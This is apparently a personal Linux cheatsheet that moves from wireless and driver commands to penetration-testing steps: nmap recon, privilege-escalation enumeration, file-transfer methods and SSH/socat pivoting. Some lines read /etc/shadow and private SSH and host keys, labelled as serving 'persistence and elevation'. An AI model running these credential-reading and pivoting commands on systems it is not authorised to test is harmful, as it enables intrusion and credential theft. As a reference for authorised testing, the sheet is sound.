Inspired by https://m0chan.github.io/2018/07/31/Linux-Notes-And-Cheatsheet.html. Plan is to add more to this.

# Find your network drivers one-liner

```
ls -1 /sys/class/net/ | grep -v lo | xargs -n1 -I{} bash -c 'echo -n {} :" " ; basename `readlink -f /sys/class/net/{}/device/driver`'
```

then

```
lsmod | grep <DRIVER>
modinfo <DRIVER> | grep ver
```

this should tell you the version of driver currently being used.

# [`iw`](https://wireless.wiki.kernel.org/en/users/documentation/iw) a `iwconfig` replacement

basics:

```
iw dev 
iw dev wlan0 link
iw dev wlan0 station dump

iw list
iw dev wlan0 scan

iw event
iw event -f
iw event -t
```

changing some settings:

```
iw dev <devname> set txpower <auto|fixed|limit> [<tx power in mBm>]
iw phy <phyname> set txpower <auto|fixed|limit> [<tx power in mBm>]

# (Note that the value this commands takes is in millibel-milliwatts (mBm) instead of the commonly used decibel-milliwatts (dBm). <power in mBm> = 100 * <power in dBm>) 

iw dev wlan0 get power_save
sudo iw dev wlan0 set power_save on

iw reg set alpha2 

# http://en.wikipedia.org/wiki/ISO_3166-1_alpha-2
```

monitor mode:

```
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up

sudo iw wlan0 set channel 36

sudo ip link set wlp4s0 down
sudo iw wlp4s0 set type managed
sudo ip link set wlp4s0 up

# useful: 

airmon-ng check kill
systemctl stop NetworkManager
```

# Enumeration

Basics

```
whoami
hostname 
uname -a
cat /etc/password
cat /etc/shadow
groups
ifconfig
netstat -an
ps aux | grep root
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts
```

Recon

```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Scan all TCP Ports
nmap INSERTIPADDRESS -p-

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333

# Scan for UDP
nmap INSERTIPADDRESS -sU

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772
```

FTP Enum

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 TARGETIP
```

# Privilege Escalation

Basics

```
cat /proc/version <- Check for kernel exploits
ps auxww
ps -ef
lsof -i
netstat -laputen
arp -e
route
cat /sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
cat /etc/issue
cat /etc/*-release
cat /proc/version
uname -a
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
lsb_release -a
```

List Cron Jobs

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

Check for readable SSH Keys for Persistence and Elevation

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

User Installed Software (sometimes misconfigured)

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
```

# Post Exploitation

Get Capabilities

```
/sbin/getcap -r / 2>/dev/null
```

Get SUID Binaries

```
find / -perm -u=s -type f 2>/dev/null
```

Check Sudo Config

```
sudo -l
```

# File Transfers

Base64

```
cat file.transfer | base64 -w 0 
echo base64blob | base64 -d > file.transfer
```

Curl

```
curl http://webserver/file.txt > output.txt
```

wget

```
wget http://webserver/file.txt > output.txt
```

FTP

```
pip install pyftpdlib
python -m pyftpdlib -p 21 -w
```

TFTP

```
service atftpd start
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
auxiliary/server/tftp
```

SCP

```
# Copy a file:
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext

# Copy a directory:
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
```

# Lateral Movement / Pivoting

SSH Local Port Forward

```
ssh <user>@<target> -L 127.0.0.1:8888:<targetip>:<targetport>
```

SSH Dynamic Port Forward

```
ssh -D <localport> user@host
nano /etc/proxychains.conf
127.0.0.1 <localport>
```

Socat Port Forward

```
./socat tcp-listen:5000,reuseaddr,fork tcp:<target ip>:5001
```